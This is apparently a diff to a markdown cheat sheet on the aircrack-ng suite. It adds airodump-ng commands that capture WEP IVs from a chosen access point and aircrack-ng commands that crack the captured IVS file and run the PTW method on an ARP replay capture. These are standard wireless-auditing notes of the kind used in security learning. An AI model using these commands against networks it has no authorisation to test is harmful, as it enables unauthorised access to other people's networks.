@@ -14,12 +14,24 @@ $ airodump-ng wlan1
 ```
 
 Begin collection on channel, BSSID and recording to file.
+
   -`-c`: Select channel number
   -`w`: Write to file
   --`bssid`: MAC address of access point
   -`--ivs`: Save only captured IVs
+
 ```bash
-$ airodump-ng -c 6 --bssid A0:21:B7:60:2E:65 --ivs -w dd-wrt wlan1
+$ airodump-ng -c 6 --bssid E0:05:C5:60:2E:65 --ivs -w capture  wlan1
 ```
 
-.
+## aircrack-ng
+
+Begin cracking IVS file on target BSSID (can perform while airodump-ng is writing).
+```bash
+$ aircrack-ng capture-01.ivs --bssid E0:05:C5:60:2E:65
+```
+
+Invoke PTW WEP cracking method method on an arp replay.
+```bash
+$ aircrack-ng -z replay_arp-0309-015802.cap
+```
